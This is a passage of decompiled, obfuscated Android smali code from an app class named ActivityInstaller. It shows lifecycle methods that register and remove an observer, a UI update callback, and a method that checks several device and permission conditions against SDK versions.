    invoke-virtual {v0}, Lhw/installer/b;->C()Ljava/util/Observable;

    move-result-object v0

    invoke-virtual {v0, p0}, Ljava/util/Observable;->addObserver(Ljava/util/Observer;)V

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->U()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    sget-object v1, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    const-string v2, "AonS"

    invoke-static {v1, v2, v0}, Lhw/utils/l;->u(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    invoke-super {p0}, Lb/j/a/e;->onStart()V

    return-void
.end method

.method protected onStop()V
    .locals 1

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->C()Ljava/util/Observable;

    move-result-object v0

    invoke-virtual {v0, p0}, Ljava/util/Observable;->deleteObserver(Ljava/util/Observer;)V

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->V()V

    invoke-super {p0}, Lb/j/a/e;->onStop()V

    return-void
.end method

.method public update(Ljava/util/Observable;Ljava/lang/Object;)V
    .locals 1

    if-nez p2, :cond_0

    :try_start_0
    new-instance p1, Lhw/installer/ActivityInstaller$a;

    invoke-direct {p1, p0}, Lhw/installer/ActivityInstaller$a;-><init>(Lhw/installer/ActivityInstaller;)V

    invoke-virtual {p0, p1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    sget-object p2, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    const-string v0, "u"

    invoke-static {p2, v0, p1}, Lhw/utils/l;->u(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_0
    :goto_0
    return-void
.end method

.method public z()Z
    .locals 4

    invoke-static {p0}, Lhw/core/a;->p(Landroid/app/Activity;)Lhw/core/a;

    move-result-object v0

    invoke-virtual {v0}, Lhw/core/a;->w()Z

    move-result v1

    const/4 v2, 0x1

    if-nez v1, :cond_0

    return v2

    :cond_0
    invoke-static {}, Lhw/utils/o;->B0()Z

    move-result v1

    if-nez v1, :cond_1

    return v2

    :cond_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x17

    if-lt v1, v3, :cond_3

    invoke-virtual {v0}, Lhw/core/a;->x()Z

    move-result v3

    if-nez v3, :cond_2

    return v2

    :cond_2
    invoke-virtual {v0}, Lhw/core/a;->u()Z

    move-result v3

    if-nez v3, :cond_3

    return v2

    :cond_3
    const/16 v3, 0x15

    if-lt v1, v3, :cond_4

    invoke-virtual {v0}, Lhw/core/a;->v()Z

    move-result v0

    if-nez v0, :cond_4

    return v2

    :cond_4
    invoke-static {}, Lhw/core/a;->z()Z

    move-result v0

    xor-int/2addr v0, v2

    xor-int/2addr v0, v2

    return v0
.end method
